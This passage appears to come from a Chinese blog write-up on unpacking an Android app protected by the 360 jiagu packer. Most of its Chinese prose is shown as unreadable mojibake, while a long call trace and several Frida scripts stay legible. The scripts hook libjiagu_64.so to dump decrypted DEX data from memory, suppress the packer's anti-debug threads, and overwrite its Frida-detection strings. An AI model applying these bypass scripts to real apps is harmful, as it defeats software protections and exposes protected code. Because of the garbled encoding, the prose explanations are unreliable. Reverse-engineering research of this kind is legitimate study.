N9__arm_c_19__arm_c_0Ev(KEkeELF)call50:sub_A3EC(KEkeELF)call51:sub_99CC(KEkeELF)call52:sub_9944(KEkeELF)call53:sub_6484(KEkeELF)call54:sub_6590(KEkeELF)call55:prctl(KEkeELF)call56:sub_6698(KEkeELF)call57:sub_9FFC(KEkeELF)call58:j_lseek_3(KEkeELF)call59:j_lseek_2(KEkeELF)call60:j_lseek_0(KEkeELF)call61:sub_9A90(KEkeELF)call62:sub_5F20(KEkeELF)call63:sub_6044(KEkeELF)call64:sub_3574(KEkeELF)call65:uncompress(KEkeELF)call66:sub_49F0(KEkeELF)call67:sub_5400(KEkeELF)call68:sub_5478(KEkeELF)call69:sub_5B08(KEkeELF)call70:sub_5650(KEkeELF)call71:sub_580C(KEkeELF)call72:open(KEkeELF)call73:atoi(KEkeELF)call74:sub_3C94(KEkeELF)call75:strncmp(KEkeELF)call76:sub_4918(KEkeELF)call77:sub_4000(KEkeELF)call78:sub_41B4(KEkeELF)call79:sub_35AC(KEkeELF)call80:sigaction(KEkeELF)call81:sub_5E6C(KEkeELF)call82:sub_5444(mainELF)call83:sub_11603C(mainELF)call84:j__Znwm(mainELF)call85:_Znwm(mainELF)call86:malloc(mainELF)call87:__cxa_atexit(mainELF)call88:sub_1160B4(mainELF)call89:sub_1160C4(mainELF)call90:strlen(mainELF)call91:memcpy(mainELF)call92:sub_1161FC(mainELF)call93:sub_1164AC(mainELF)call94:sub_1164D8(mainELF)call95:sub_116528(mainELF)call96:sub_1165C8(mainELF)call97:sub_1A32C0(mainELF)call98:sub_1A3150(mainELF)call99:sub_1A3204(mainELF)call100:sub_1166FC(mainELF)call101:sub_116728(mainELF)call102:sub_116750(mainELF)call103:sub_116830(mainELF)call104:sub_116BA0(KEkeELF)call105:sub_633C(KEkeELF)call106:sub_8130(KEkeELF)call107:sub_4C70(KEkeELF)call108:sub_825C(KEkeELF)call109:sub_8B50(KEkeELF)call110:sub_8ED4(KEkeELF)call111:sub_8430(mainELF)call112:JNI_OnLoad(mainELF)call113:j_interpreter_wrap_int64_t(mainELF)call114:interpreter_wrap_int64_t(KEkeELF)call115:interpreter_wrap_int64_t_bridge(KEkeELF)call116:sub_9D60(mainELF)call117:sub_1B3F0C(mainELF)call118:gettimeofday(mainELF)call119:sub_11BD9C(mainELF)call120:sub_1182D8(mainELF)call121:sub_123970(mainELF)call122:sub_1B6448(mainELF)call123:getenv(mainELF)call124:sub_11F130(mainELF)call125:sub_12047C(mainELF)call126:j__ZdlPv(mainELF)call127:_ZdlPv(mainELF)call128:free(mainELF)call129:sub_1427E8(mainELF)call130:dlopen(mainELF)call131:sub_11BDA8(mainELF)call132:sub_11BE58(mainELF)call133:sub_11F69C(mainELF)call134:sub_117BE0(mainELF)call135:sub_117CA0(mainELF)call136:fopen(mainELF)call137:sub_117E90(mainELF)call138:sub_14285C(mainELF)call139:sub_1429CC(mainELF)call140:sub_11C1AC(mainELF)call141:sub_11C1B4(mainELF)call142:sub_11C210(KEkeELF)call143:sub_166C4(KEkeELF)call144:memcpy(mainELF)call145:sub_123324(mainELF)call146:sub_1205A0(mainELF)call147:sub_11F768(mainELF)call148:memcmp(mainELF)call149:opendir(mainELF)call150:closedir(mainELF)call151:sub_11859C(mainELF)call152:sub_11C268(mainELF)call153:sub_11C300(mainELF)call154:sub_117B68(mainELF)call155:sub_1186B8(mainELF)call156:sub_143964(mainELF)call157:sub_1B66A8(mainELF)call158:pthread_mutex_lock(mainELF)call159:sub_142EA0(mainELF)call160:sub_143A38(mainELF)call161:sub_11CF8C(mainELF)call162:sub_131D58(mainELF)call163:sub_1B66D0(mainELF)call164:pthread_mutex_unlock(mainELF)call165:sub_1178E8(mainELF)call166:sub_13D70C(mainELF)call167:sub_19F984(mainELF)call168:sub_11F1C8(mainELF)call169:atoi(mainELF)call170:sub_12D2F8(mainELF)call171:sub_17ABE8(mainELF)call172:sub_172660(mainELF)call173:sub_13BFF0(mainELF)call174:sub_172AA4(mainELF)call175:sub_13BD80(mainELF)call176:sub_13BE2C(mainELF)call177:sub_13BE4C(mainELF)call178:memmove(mainELF)call179:sub_13BE64(mainELF)call180:sub_172D78(mainELF)call181:sub_13E510(mainELF)call182:sub_1926F0(mainELF)call183:sub_13DB7C(mainELF)call184:sub_1B7A08(mainELF)call185:sub_1B7ABC(mainELF)call186:pthread_cond_broadcast(mainELF)call187:sub_12FA34(mainELF)call188:sub_120664(mainELF)call189:sub_1332B8(mainELF)call190:sub_13E0F8(mainELF)call191:sub_12743C(mainELF)call192:sub_124C68(mainELF)call193:sub_125DC4(mainELF)call194:sub_124510(mainELF)call195:sub_126888(mainELF)call196:strdup(mainELF)call197:sub_126920(mainELF)call198:sub_122180(mainELF)call199:sub_11BC1C(mainELF)call200:sub_13DF34(mainELF)call201:getpid(mainELF)call202:memset(mainELF)call203:snprintf(mainELF)call204:sub_124FA0(mainELF)call205:sub_1B6498(mainELF)call206:sub_1A0C88(mainELF)call207:sub_217444(mainELF)call208:sub_2175E0(mainELF)call209:read(mainELF)call210:strncmp(mainELF)call211:close(mainELF)call212:sub_1B578C(mainELF)call213:j___self_lseek(mainELF)call214:__self_lseek(mainELF)call215:sub_1B586C(mainELF)call216:j_j___read_self(mainELF)call217:j___read_self(mainELF)call218:__read_self(mainELF)call219:sub_1B6528(mainELF)call220:sub_1B6578(mainELF)call221:mmap(mainELF)call222:sub_1B5B50(mainELF)call223:calloc(mainELF)call224:memchr(mainELF)call225:sub_1B5D04(mainELF)call226:sub_1B5EC4(mainELF)call227:sub_1B6270(mainELF)call228:sub_1B6180(mainELF)call229:sub_1B6678(mainELF)call230:inflateInit2_(mainELF)call231:inflate(mainELF)call232:inflateEnd(mainELF)call233:sub_1B6540(mainELF)call234:munmap(mainELF)call235:sub_1B56F8(mainELF)call236:sub_19BC9C(mainELF)call237:sub_19CCD4(mainELF)call238:sub_12D470(mainELF)call239:sub_142FE0(mainELF)call240:sub_143008(mainELF)call241:sub_142ABC(mainELF)call242:sub_143848(mainELF)call243:sub_143B48(mainELF)call244:sub_143088(mainELF)call245:sub_1222D0(mainELF)call246:sub_14316C(mainELF)call247:sub_142954(KEkeELF)call248:_Z9__arm_a_2PcmS_Rii(mainELF)call249:sub_142894(mainELF)call250:sub_1428BC(mainELF)call251:sub_127DCC(mainELF)call252:sub_14292C(mainELF)call253:sub_121B78(mainELF)call254:sub_121BE0(mainELF)call255:sub_123CE8(mainELF)call256:sub_123BC0(mainELF)call257:sub_11959C(mainELF)call258:sub_1AC170(mainELF)call259:pthread_create(mainELF)call260:sub_1AC210(mainELF)call261:sub_1B5DE4(mainELF)call262:sub_1B60E8(mainELF)call263:sub_19F7C4(mainELF)call264:sub_1B2DC8(mainELF)call265:sub_1B1CE8(mainELF)call266:sub_1B0974(mainELF)call267:sub_1AFE6C(mainELF)call268:sub_126ED8(mainELF)call269:sub_1AFE8C(mainELF)call270:sub_1AFE90(mainELF)call271:sub_1AB87C(mainELF)call272:sub_1B26D4(mainELF)call273:sub_1B26F4(mainELF)call274:sub_1B27C8(KEkeELF)call275:j_ffi_prep_cif_var(KEkeELF)call276:ffi_prep_cif_var(mainELF)call277:sub_1AAF48(mainELF)call278:sub_1AAF54(mainELF)call279:sub_2162D4(mainELF)call280:sub_1B2898(mainELF)call281:sub_1B2918(mainELF)call282:sub_1ABE90(mainELF)call283:sub_13E0EC(mainELF)call284:sub_124900(mainELF)call285:sub_1A0C34(mainELF)call286:sub_217188(mainELF)call287:j_strcmp(mainELF)call288:strcmp(mainELF)call289:sub_194514(mainELF)call290:sub_1A2380(mainELF)call291:sub_1A23CC(mainELF)call292:sub_1A2718(mainELF)call293:sub_1A2A94(mainELF)call294:sub_1A25E0(mainELF)call295:sub_1A2984åˆ†æè¾“å‡ºçš„ç»“æœï¼Œæˆ‘ä»¬å‘ç°äº†ä¸‰ä¸ªæœ‰è¶£çš„å‡½æ•° inflateInit2_ , inflate , inflateEnd , è¿™ä¸æ˜¯ zlib ç”¨æ¥è§£å‹ç¼©çš„å‡½æ•°å˜›ï½ (mainELF)call230:inflateInit2_(mainELF)call231:inflate(mainELF)call232:inflateEndå¯¹ inflateInit2_ äº¤å‰å¼•ç”¨ï¼Œå‘ç°æœ‰ä¸¤ä¸ªå‡½æ•°è°ƒç”¨äº†å®ƒ é‚£ä¹ˆè¦æ€ä¹ˆçŸ¥é“æ˜¯å“ªä¸€ä¸ªå‡½æ•°å…ˆè°ƒç”¨çš„ inflateInit2_ å‘¢ï¼Ÿå‘ä¸Šçœ‹çœ‹å‡½æ•°è°ƒç”¨é“¾å°±è¡Œäº† äºæ˜¯æˆ‘ä»¬å‘ç°æ˜¯ sub_1B6270 è°ƒç”¨äº† inflateInit2_ (mainELF)call227:sub_1B6270 &lt;--(mainELF)call228:sub_1B6180(mainELF)call229:sub_1B6678(mainELF)call230:inflateInit2_(mainELF)call231:inflate(mainELF)call232:inflateEndæˆ‘ä»¬æ¥åˆ° sub_1B6270 , å…ˆåˆ° https://github.com/madler/zlib æŠŠ zlib.h ä¸­çš„ z_stream_s , å¯¼å…¥çš„æ–¹æ³•å’Œä¹‹å‰ä¸€æ · # define z_const consttypedef unsigned char Byte; /* 8 bits */typedef unsigned int uInt; /* 16 bits or more */typedef unsigned long uLong; /* 32 bits or more */typedef struct z_stream_s &#123; z_const Bytef *next_in; /* next input byte */ uInt avail_in; /* number of bytes available at next_in */ uLong total_in; /* total number of input bytes read so far */ Bytef *next_out; /* next output byte will go here */ uInt avail_out; /* remaining free space at next_out */ uLong total_out; /* total number of bytes output so far */&#125; z_stream;é‡å®šä¹‰ s çš„ç±»å‹ä¸º z_stream , è¿™å››ä¸ªå­—æ®µçš„å«ä¹‰å¦‚ä¸‹ s.next_in : å‹ç¼©æ•°æ® s.avail_in : å‹ç¼©æ•°æ®çš„é•¿åº¦ s.next_out : è§£å‹åçš„æ•°æ® s.avail_out : è§£å‹åæ•°æ®çš„é•¿åº¦ å„ä¸ªæˆå‘˜çš„åç§»å¦‚å›¾æ‰€ç¤º éšåæˆ‘ä»¬ç”¨ frida å» hook ä¸€ä¸‹ inflate å‡½æ•°çœ‹çœ‹è§£å‹ç¼©ä¹‹åçš„æ•°æ®æ˜¯ä»€ä¹ˆ è¿™é‡Œæœ‰ä¸ªæŠ€å·§ï¼Œå°±æ˜¯å¦‚ä½•å¯ä»¥ hook åˆ°ä¸» ELF ä¸­çš„å‡½æ•°ï¼Œå› ä¸ºåœ¨å£³ ELF åŠ è½½è¿›å†…å­˜æ—¶ï¼Œä¸» ELF è¿˜æ²¡æœ‰è¢«åŠ è½½ï¼Œæ‰€ä»¥å‡å¦‚åœ¨å£³ ELF é€šè¿‡ android_dlopen_ext æ‰“å¼€æ—¶æˆ‘ä»¬è¿›è¡Œ hook, æ˜¯ä¼š hook å¤±è´¥çš„ é‚£ä¹ˆå¦‚ä½•æ‰èƒ½è·å–åˆ°ä¸» ELF çš„ hook æ—¶æœºå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡ç»Ÿè®¡å¤–éƒ¨å‡½æ•°çš„è°ƒç”¨æ¬¡æ•°æ¥åˆ¤æ–­æ˜¯å¦å·²ç»åŠ è½½äº†ä¸» ELF, ä¾‹å¦‚æˆ‘è¿™é‡Œï¼Œæˆ‘é€šè¿‡ zlib_count ç»Ÿè®¡å¤–éƒ¨å‡½æ•° inflate è°ƒç”¨æ¬¡æ•°ï¼Œå› ä¸ºåœ¨å£³ ELF ä¼šä½¿ç”¨ uncompress è°ƒç”¨ä¸€æ¬¡ inflate , æ‰€ä»¥å½“ç¬¬äºŒæ¬¡è°ƒç”¨ inflate , æˆ‘ä»¬å°±çŸ¥é“è¿™è‚¯å®šæ˜¯ä¸» ELF è°ƒç”¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨è¿™ä¸ªä½ç½®æ”¾å¿ƒå¤§èƒ†çš„ hook äº† function dump_memory(start,size,filename) &#123; var file_path = \"/data/data/com.oacia.apk_protect/\" + filename; var file_handle = new File(file_path, \"wb\"); if (file_handle &amp;&amp; file_handle != null) &#123; var libso_buffer = start.readByteArray(size.toUInt32()); file_handle.write(libso_buffer); file_handle.flush(); file_handle.close(); console.log(\"[dump]:\", file_path); &#125;&#125;function hook_zlib_result()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1B63F0), &#123; // fd, buff, len onEnter: function (args) &#123; console.log(\"inflate result\") console.log(hexdump(next_in, &#123; offset: 0,// ç›¸å¯¹åç§» length: 0x50,//dump çš„å¤§å° header: true, ansi: true &#125;)); console.log(hexdump(next_out, &#123; offset: 0,// ç›¸å¯¹åç§» length: 0x50,//dump çš„å¤§å° header: true, ansi: true &#125;)); dump_memory(next_out,avail_out,\"dex001\") &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;var zlib_count=0;var next_in,avail_in,next_out,avail_out;function hook_zlib()&#123; Interceptor.attach(Module.findExportByName(null, \"inflate\"), &#123; // fd, buff, len onEnter: function (args) &#123; zlib_count+=1 if(zlib_count>1)&#123; hook_zlib_result(); &#125; next_in=ptr(args[0].add(0x0).readS64()); avail_in=ptr(args[0].add(0x8).readS64()); next_out=ptr(args[0].add(0x18).readS64()); avail_out=ptr(args[0].add(0x20).readS64()); console.log(hexdump(next_in, &#123; offset: 0,// ç›¸å¯¹åç§» length: 0x50,//dump çš„å¤§å° header: true, ansi: true &#125;)); console.log(args[1]); &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;è§£å‹ç¼©ä¹‹åçš„è¾“å‡ºå¦‚ä¸‹ï¼Œåœ¨è¾“å‡ºçš„æ–‡ä»¶å¤´ï¼Œæˆ‘ä»¬å‘ç°äº† dex035 , æ‰€ä»¥æˆ‘ä»¬æŠŠè¿™å—å†…å­˜ dump ä¸‹æ¥çœ‹çœ‹ï¼Œä½¿ç”¨ä¸Šæ–¹çš„ dump_memory(start,size,filename) å‡½æ•°å³å¯ æŠŠè¿™ä¸ªè§£å‹ç¼©ä¹‹åçš„ dex æ‹–å…¥åˆ° jadx é‡Œé¢ï¼Œå´å‘ç°è¿™ä¸ªç±»åæ€ä¹ˆå’Œå£³ DEX çš„ç±»åä¸€æ¨¡ä¸€æ ·ï¼Œé€šè¿‡æ ¡éªŒå“ˆå¸Œå‘ç° dump ä¸‹æ¥çš„ dex å’Œå£³ dex å…¶å®æ˜¯åŒä¸€ä¸ªæ–‡ä»¶ æˆ‘ä»¬åœ¨ä¹‹å‰çš„åˆ†æä¸­çŸ¥é“å£³ dex çš„æœ«å°¾é™„å¸¦äº†ä¸€å¤§ä¸²çš„åŠ å¯†æ•°æ®ï¼Œæ‰€ä»¥é€šè¿‡å°†è¿™ä¸ªè§£å‹ç¼©å¾—åˆ°äº†è¿™ä¸ª dex, å°±è¯´æ˜é©¬ä¸Šè¦è¿›è¡ŒåŠ å¯†ä¸» DEX çš„è§£å¯†æ“ä½œäº† è§£å‹ç¼©çš„å‡½æ•°æ˜¯ sub_1B6270 , æ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­é€šè¿‡ stalker_trace_so æ‰“å°å‡ºæ¥çš„å†…å®¹ï¼Œå¹¶åˆ©ç”¨äº¤å‰å¼•ç”¨æ¥è¿½è¸ªè¯¥å‡½æ•°çš„è°ƒç”¨é“¾ å°±æ¯”å¦‚è¯´å¯¹äºå‡½æ•° sub_1B6270 , å®ƒæœ‰ä¸¤ä¸ªäº¤å‰å¼•ç”¨ é€šè¿‡ stalker_trace_so æ‰“å°å‡ºæ¥çš„å‡½æ•°è°ƒç”¨é“¾ï¼Œæˆ‘ä»¬å‘ç°æ˜¯ sub_1A0C88 åœ¨ sub_1B6270 ä¹‹å‰è°ƒç”¨ï¼Œæ‰€ä»¥å‡½æ•°çš„è°ƒç”¨å…³ç³»å°±æ˜¯ sub_1A0C88-&gt;sub_1B6270 , ä»¥æ­¤ç±»æ¨ (mainELF)call206:sub_1A0C88(mainELF)call227:sub_1B6270æ‰€ä»¥ä¸€è·¯è·Ÿè¿‡æ¥ä¹‹åï¼Œå‡½æ•°çš„è°ƒç”¨é“¾ä¸º sub_1332B8-&gt;sub_124FA0-&gt;sub_1A0C88-&gt;sub_1B6270-&gt;inflate , sub_1332B8 å‡½æ•°ä¹‹åå°±æ²¡æœ‰äº¤å‰å¼•ç”¨äº† (mainELF)call189:sub_1332B8(mainELF)call204:sub_124FA0(mainELF)call206:sub_1A0C88(mainELF)call227:sub_1B6270(mainELF)call230:inflateInit2_(mainELF)call231:inflate(mainELF)call232:inflateEndåœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å‘ç°äº† apk@classes.dex , è€Œå®ƒçš„ä½œç”¨ï¼Œæ­£æ˜¯ä¸ºäº†æ‰¾åˆ°å·²åŠ è½½åˆ°å†…å­˜ä¸”ä¼˜åŒ–åçš„å£³ dex åœ¨åŠ å›ºå£³åè°ƒè¯•åˆæ­¥åˆ†æçš„ååŠéƒ¨åˆ†ï¼Œæˆ‘ä»¬æ‰“å°å‡ºäº†åŠ å›ºå£³æ‰“å¼€ dex çš„å †æ ˆå›æº¯ï¼Œç°åœ¨æˆ‘ä»¬ç›´æ¥è·³è½¬åˆ°ç›¸å¯¹åº”çš„åœ°æ–¹çœ‹çœ‹ æˆ‘ä»¬åˆ° 0x19b780 çœ‹çœ‹ï¼Œçœ‹èµ·æ¥æ˜¯ä¸€ä¸ªæ ‡å‡†çš„æ‰“å¼€å¹¶å†™å…¥æ–‡ä»¶çš„å‡½æ•° éšåå¯¹è¯¥å‡½æ•°è¿›è¡Œäº¤å‰å¼•ç”¨ï¼Œæˆ‘ä»¬å‘ç° sub_1332B8 ç«Ÿç„¶è°ƒç”¨äº†å®ƒï¼Œå°±åœ¨åˆšåˆšæˆ‘ä»¬å°±åˆ†æå‡ºè¿™ä¸ªå‡½æ•°ä¸­å¯æ˜¯åŒæ—¶ä¹Ÿæ‰§è¡Œäº†ä»å†…å­˜ä¸­è·å–å£³ dex çš„æ“ä½œçš„å‘¢ æˆ‘ä»¬å¯¹è¿™ä¸¤å¤„è°ƒç”¨éƒ½ hook ä¸€ä¸‹çœ‹çœ‹æ˜¯ä»€ä¹ˆæƒ…å†µï¼Œæ‰“å°çš„ç»“æœå¦‚ä¸‹ï¼Œè¯´æ˜è¿™ä¸¤å¤„è°ƒç”¨éƒ½æ‰“å¼€äº† dex, sub_1332B8 ä¸­çš„å‰ä¸€ä¸ªè°ƒç”¨æ‰“å¼€äº† classes.dex , åä¸€ä¸ªè°ƒç”¨æ‰“å¼€äº† classes2.dex å’Œ classes3.dex , è€Œ classes.dex æ–‡ä»¶ä¸­çš„å†…å®¹å°±æ˜¯åŠ å¯†çš„ä¸» dex åœ¨åˆ›å»ºå®Œ classes2.dex å’Œ classes3.dex , é€šè¿‡ hook å‘ç°è°ƒç”¨åœ¨è°ƒç”¨ sub_128D44 ä¹‹åè¿›ç¨‹å°±é€€å‡ºäº† æˆ‘ä»¬å» hook ä¸€ä¸‹ sub_128D44 è¿™ä¸ªå‡½æ•°ï¼Œå‘ç°ä¼ å…¥çš„å‚æ•° v8 æ­£æ˜¯åŠ å¯†çš„ä¸» DEX è€Œ sub_128D44 å‡½æ•°æ˜¯è¿™ä¸ªæ ·å­çš„ï¼Œå¹¶ä¸”åœ¨å£³ ELF åŠ è½½æ—¶å¯åŠ¨ stalker_trace_so çš„ trace_so() å‡½æ•°æ‰€æ‰“å°å‡ºçš„ç»“æœä¸­ï¼Œå¹¶æ²¡æœ‰è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨è¢«æ‰“å°å‡ºæ¥ è¿™è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ å¾ˆç®€å•ï¼Œåœ¨è°ƒç”¨ sub_128D44 çš„ä½ç½®å†å»è°ƒç”¨ä¸€æ¬¡ trace_so() å‡½æ•°ä»ç°åœ¨çš„ä½ç½®å¼€å§‹æ‰“å°å‡½æ•°çš„è°ƒç”¨é“¾ä¸å°±è¡Œå’¯ï¼š) å‡½æ•°è°ƒç”¨å…³ç³»å¦‚ä¸‹ï¼Œæˆ‘ä»¬å‘ç°å† mainELF è°ƒç”¨å®Œ sub_128D44 ä¹‹åï¼Œé€šè¿‡ä¸€ç³»åˆ—æ“ä½œåˆå›åˆ°äº†å£³ ELF ä¸­ï¼Œæœ€ç»ˆè°ƒç”¨ raise å¯¼è‡´è¿›ç¨‹é€€å‡º ç„¶è€Œï¼Œå½“æˆ‘è·³è½¬åˆ°æœ€åè°ƒç”¨çš„å‡ ä¸ªå‡½æ•°æ—¶ï¼Œå¯ä»¥è¯´å‡½æ•°å¤æ‚åˆ°è®©äººå’‹èˆŒ è¿™ä¹ˆå¤æ‚ï¼Œæ˜¯ç»™äººåˆ†æçš„å—ï¼ï¼Ÿæ‰€ä»¥æˆ‘ä¾¿å¡åœ¨è¿™é‡Œäº†å¾ˆä¹… æˆ‘æƒ³äº†æƒ³ç°åœ¨æ‘†åœ¨é¢å‰çš„æœ‰ä¸¤æ¡è·¯ï¼Œæ˜¯å’Œä¸€çœ¼æœ›ä¸åˆ°å°½å¤´çš„è¿™ä¿©å‡½æ•°æ­»ç£•åˆ°åº•ï¼Œè¿˜æ˜¯é€‰æ‹©æŠŠ 360 åŠ å›ºçš„åè°ƒè¯•æå®šï¼Ÿ æˆ‘é€‰æ‹©åè€…ï¼Œå› ä¸ºæ˜æ˜¾æå®šåè°ƒè¯•è¦æ¯”æŠŠè¿™ä¸¤ä¸ªå‡½æ•°åˆ†ææ˜ç™½è¦ç¨å¾®ç®€å•ä¸€ç‚¹ # åŠ å›ºå£³åè°ƒè¯•æ·±å…¥åˆ†æ åœ¨åŠ å›ºå£³åè°ƒè¯•åˆæ­¥åˆ†æä¸­ï¼Œæˆ‘æ›¾å°è¯•è¿‡ dbus , TracerPid , readlink , strstr éƒ½æ²¡æœ‰æ˜æ˜¾çš„æ•ˆæœï¼Œåªæœ‰ hook open å‡½æ•°è®©æˆ‘çœ‹åˆ°äº†äº›è®¸çš„æ›™å…‰ï¼Œé‚£ä¹ˆç°åœ¨åº”è¯¥è¿˜æœ‰ä¸€ç§éå¸¸é‡è¦çš„åè°ƒè¯•æ‰‹æ®µæ²¡æœ‰ç”¨åˆ°ï¼Œé‚£å°±æ˜¯ pthread_create åè°ƒè¯• function check_pthread_create() &#123; var pthread_create_addr = Module.findExportByName(null, 'pthread_create'); var pthread_create = new NativeFunction(pthread_create_addr, \"int\", [\"pointer\", \"pointer\", \"pointer\", \"pointer\"]); Interceptor.replace(pthread_create_addr, new NativeCallback(function (parg0, parg1, parg2, parg3) &#123; var so_name = Process.findModuleByAddress(parg2).name; var so_path = Process.findModuleByAddress(parg2).path; var so_base = Module.getBaseAddress(so_name); var offset = parg2 - so_base; var PC = 0; if ((so_name.indexOf(\"jiagu\") > -1)) &#123; console.log(\"======\") console.log(\"find thread func offset\", so_name, offset.toString(16)); Thread.backtrace(this.context, Backtracer.ACCURATE).map(addr_in_so); var check_list = []//1769036,1771844 if (check_list.indexOf(offset)!==-1) &#123; console.log(\"check bypass\") &#125; else &#123; PC = pthread_create(parg0, parg1, parg2, parg3); &#125; &#125; else &#123; PC = pthread_create(parg0, parg1, parg2, parg3); &#125; return PC; &#125;, \"int\", [\"pointer\", \"pointer\", \"pointer\", \"pointer\"]))&#125;function addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; console.log(addr.toString(16),\"is in\",process_Obj_Module_Arr[i].name,\"offset: 0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16)); &#125; &#125;&#125;æ³¨å…¥ä»£ç ä¹‹åï¼Œ pthread_create çš„è°ƒç”¨éƒ½æŒ‡å‘äº†åŒä¸€ä¸ªåœ°å€ 0x17710 æˆ‘ä»¬è·³è½¬åˆ°è¿™ä¸ªåœ°å€ä¹‹åå´å‘ç°ä¸ºä»€ä¹ˆä¼šæ²¡æœ‰ pthread_create å‘¢ï¼Ÿï¼Ÿ çœ‹äº†ä¸€çœ¼è¿™ä¸ªä»£ç æ‰€åœ¨çš„å‡½æ•°çš„åç§° ffi_call_SYSV hmmm, çœ‹æ¥æ˜¯ç”¨ libffi åŠ¨æ€è°ƒç”¨å‡½æ•°å‘€ ç›´æ¥åˆ° libffi çš„ github ä»“åº“çœ‹ä¸€çœ¼ ffi_call_SYSV çš„æºç  ä¸€è¿›å»æ³¨é‡Šéƒ½å†™å¾—æ¸…æ¸…æ¥šæ¥šäº† åˆ©ç”¨æ³¨é‡Šå°±å¯ä»¥çŸ¥é“æ¯è¡Œæ±‡ç¼–éƒ½ä»£è¡¨ä»€ä¹ˆäº†ï¼Œæ‰€ä»¥ BLR X24 è¡¨ç¤ºå»åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œè€Œå‰é¢çš„ X0 , X2 , X4 , X6 æ˜¯ç”¨æ¥ä¼ å‚çš„ æˆ‘ä»¬ hook ä¸€ä¸‹ x0 çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ•æ„Ÿçš„å­—ç¬¦ä¸² function anti_frida_check()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1770C), &#123; onEnter: function (args) &#123; try&#123; console.log(this.context.x0.readCString()) &#125; catch (e)&#123; &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;ç„¶è€Œç¥å¥‡çš„æ˜¯ï¼Œæˆ‘ä»…ä»…å» hook å¹¶æ‰“å° x0 å­—ç¬¦ä¸²ï¼Œå…¶ä»–ä»€ä¹ˆäº‹æƒ…éƒ½ä¸å¹²ï¼Œapk ç«Ÿç„¶ç¥å¥‡çš„è¿›å»äº†ï¼Œåªä¸è¿‡ä¼šæ²¡æœ‰å“åº”ï¼Œæ„Ÿè§‰è·ç¦»æˆåŠŸä¸è¿œäº†å‘¢ æœ‰ç‚¹æ„æ€ï¼Œç­›é€‰ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ•æ„Ÿçš„å­—ç¬¦ä¸²å¥½å’¯ function anti_frida_check()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1770C), &#123; onEnter: function (args) &#123; try&#123; var s = this.context.x0.readCString(); if (s.indexOf('frida')!==-1 || s.indexOf('gum-js-loop')!==-1 || s.indexOf('gmain')!==-1 || s.indexOf('linjector')!==-1 || s.indexOf('/proc/')!==-1)&#123; console.log(s) &#125; &#125; catch (e)&#123; &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;ç«Ÿç„¶è¿˜çœŸæœ‰ï¼Œé‚£å°±æŠŠè¿™äº›å­—ç¬¦ä¸²å…¨éƒ¨æ›¿æ¢æˆæ— æ„ä¹‰çš„å­—ç¬¦ä¸²çœ‹çœ‹å’¯ function anti_frida_check()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1770C), &#123; onEnter: function (args) &#123; try&#123; var s = this.context.x0.readCString(); if (s.indexOf('frida')!==-1 || s.indexOf('gum-js-loop')!==-1 || s.indexOf('gmain')!==-1 || s.indexOf('linjector')!==-1 || s.indexOf('/proc/')!==-1)&#123; console.log(s) Memory.protect(this.context.x0, Process.pointerSize, 'rwx'); var replace_str=\"\" for(var i=0;i&lt;s.length;i++)&#123; replace_str+=\"0\" &#125; this.context.x0.writeUtf8String(replace_str); &#125; &#125; catch (e)&#123; &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;ç„¶è€Œè¿™æ ·åšè¿›ç¨‹å´ä¸€ä¸ªåŠ²çš„å´©æºƒï¼ï¼ æ²¡äº‹ï¼Œå¯„å­˜å™¨ x0 ç”¨ä¸äº†ï¼Œè¿˜æœ‰ x2 , x4 , x6 æ²¡æ›¿æ¢è¿‡å‘¢ï¼æˆ‘ä¸€ä¸ªä¸€ä¸ªçš„è¯•è¿‡å»ï¼Œç»ˆäºï¼Œå½“æˆ‘å°†å¯„å­˜å™¨æ”¹æˆ x6 æ—¶ï¼Œè¿›ç¨‹ç»ˆäºä¸å†å´©æºƒæˆåŠŸçš„è¿›å…¥äº† apk! function anti_frida_check()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1770C), &#123; onEnter: function (args) &#123; try&#123; var s = this.context.x6.readCString(); if (s.indexOf('frida')!==-1 || s.indexOf('gum-js-loop')!==-1 || s.indexOf('gmain')!==-1 || s.indexOf('linjector')!==-1 || s.indexOf('/proc/')!==-1)&#123; //console.log(s) Memory.protect(this.context.x0, Process.pointerSize, 'rwx'); var replace_str=\"\" for(var i=0;i&lt;s.length;i++)&#123; replace_str+=\"0\" &#125; this.context.x0.writeUtf8String(replace_str); &#125; &#125; catch (e)&#123; &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125; çœ‹ä¸€çœ¼æ£€æµ‹çš„å­—ç¬¦ä¸²ï¼Œæ€ä¹ˆå…¨æ˜¯ /memfd:frida-agent-64.so # ä¸» DEX åŠ è½½æµç¨‹åˆ†æ å›åˆ°è¿™ä¸ªå¡äº†æˆ‘ä»¬å¾ˆä¹…ä½ç½®ï¼Œç°åœ¨è¿‡äº†åè°ƒè¯•ä¹‹åè¿™é‡Œçš„ä»£ç ç»ˆäºå¯ä»¥ç»§ç»­æ‰§è¡Œä¸‹å»äº† 